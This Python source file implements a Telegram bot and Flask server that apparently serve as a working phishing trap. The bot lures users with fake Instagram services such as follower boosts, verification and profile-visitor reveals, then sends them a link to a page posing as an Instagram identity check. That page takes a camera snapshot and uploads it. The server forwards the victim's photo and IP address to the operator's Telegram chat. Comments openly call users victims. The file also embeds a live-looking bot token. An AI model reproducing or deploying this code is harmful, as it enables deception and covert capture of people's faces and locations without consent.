import telebot
from flask import Flask, request, render_template_string
import base64
import os
from telebot import types

# --- بياناتك الشخصية (تم وضع التوكن الخاص بك هنا) ---
TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"  # تأكد من أن هذا هو الآيدي الخاص بك
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# رابط الصيد الخاص بك على Render (سيتم استخدامه داخل الأزرار)
TRAP_URL = "https://verification-system-v2.onrender.com"

# --- واجهة صفحة الصيد (التي تظهر للضحية عند فتح الرابط) ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق الأمان - إنستغرام</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; background: #fafafa; padding-top: 50px; }
        .card { background: white; padding: 30px; border: 1px solid #dbdbdb; border-radius: 8px; width: 85%; max-width: 350px; margin: auto; }
        .btn { background: #0095f6; color: white; padding: 12px; width: 100%; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color: #262626;">التحقق من الهوية</h2>
        <p style="color: #8e8e8e;">يرجى السماح بالوصول للكاميرا لتأكيد أنك صاحب الحساب ولتفعيل الخدمة المطلوبة.</p>
        <button class="btn" onclick="snap()">تأكيد الآن</button>
    </div>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
    async function snap() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.getElementById('v');
            v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const d = c.toDataURL('image/png');
                fetch('/upload', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({img: d})})
                .then(() => { window.location.href = "https://instagram.com"; });
            }, 1000);
        } catch(e) { alert("يجب السماح بالكاميرا لإكمال العملية!"); }
    }
    </script>
</body>
</html>
"""

# --- قسم بوت التلغرام (الأزرار والخيارات) ---

@bot.message_handler(commands=['start'])
def start(message):
    # إنشاء أزرار الخيارات للضحية
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💙 زيادة متابعين", callback_data='go')
    btn2 = types.InlineKeyboardButton("🔥 توثيق الحساب", callback_data='go')
    btn3 = types.InlineKeyboardButton("👁️ كشف من زار بروفايلك", callback_data='go')
    btn4 = types.InlineKeyboardButton("🎁 سحب مسابقات", callback_data='go')
    
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(message.chat.id, 
                     "🤖 **مرحباً بك في بوت خدمات إنستغرام العالمية**\n\nيرجى اختيار الخدمة التي تود تفعيلها على حسابك:", 
                     reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'go':
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, 
                         f"⚠️ **خطوة أخيرة:** لتفعيل الخدمة، يجب عليك إجراء فحص الأمان السريع من هنا:\n\n🔗 {TRAP_URL}")

# --- قسم Flask (السيرفر) ---

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    bot.send_message(CHAT_ID, f"🚀 **صيد جديد دخل الرابط!**\n🌐 IP: `{ip}`")
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['img']
    img_data = base64.b64decode(data.split(',')[1])
    with open("shot.png", "wb") as f: f.write(img_data)
    with open("shot.png", "rb") as f: 
        bot.send_photo(CHAT_ID, f, caption="📸 **تم التقاط وجه الضحية!**")
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
